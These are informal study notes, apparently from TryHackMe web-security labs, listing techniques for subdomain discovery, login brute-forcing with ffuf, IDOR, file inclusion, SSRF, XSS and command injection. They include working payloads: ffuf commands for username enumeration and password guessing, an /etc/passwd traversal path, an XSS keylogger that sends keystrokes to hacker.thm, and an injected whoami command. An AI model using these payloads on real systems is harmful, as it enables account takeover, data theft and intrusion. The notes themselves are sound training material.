# finding subdomains and pages
created for domain
discover subdomains registerd with https://crt.sh and https://ui.ctsearch.entrust.com/ui/ctsearchui
site:www.tryhackme.com  site:*.tryhackme.com can be used to find subdomains
dnsrecon try from list of common subdomains for example api part of website
Sublist3r uses above method and common sites to find subdomains ./sublist3r.py -d acmeitsupport.thm

Virtual hosts
find non public subdomains use ffuf for example hidden admin page ffuf -u https://codingo.io/FUZZ -w ./wordlist.txt replace "FUZZ" with whats in wordlist

# Authentication Bypass
get website url and respone when username already exists
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists" 
when usernames thats registred is found try fuff with password

ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200

# autchenticate Bypass
cookies is encoded or hashed that can be decoded if you know the format


# idor
http://online-service.thm/profile?user_id=1000
when you change for example id 
if its encoded with base64 or other you can guees the format and encod new online. worth to post to crackstation
if you cant detect id. Creat new account and swap encoded if you see others content found idor

# File inclusion
lfi rfi directory traversal
unsantized user input 
bad input handlig and something like this is possible http://webapp.thm/get.php?file=../../../../etc/passwd
rfi
when allow_url_fopen is on with include()
enter url to force download from remote sderver http://webapp.thm/get.php?file=www.hackerserver.com
# ssrf
bypass input validation to give commands directly to locked api
common places to look
> when full url is used in adress bar or in code
> form value thats an url
> partial url thats connected to api
trial and error to find api and check its endpoints

# xss
get code to inject on others frontend javascript
kan keylog and send session with <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
> reflected xss
when user supplied javascript can be run example if url paramn is shown 1:1 in browser can change url param to <script src="url.js"></script>
> Stored XSS
How to test for Stored XSS:
stuff stored in comments and discriptons
You'll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to;
client sided validated input creates xss for example send code in form age field
> dom based xss
resarch more  https://www.w3.org/TR/REC-DOM-Level-1/introduction.html
https://owasp.org/www-community/attacks/DOM_Based_XSS
> blind xss
same as stored-xss but to unverifanble places like admin portals or support tickets. https://xsshunter.com/features is tool for it
> Command injection
when app pass data and make system calls with userinput as param.
to check if it works with ping and sleep or curl. or whoami if the application show responses
curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoam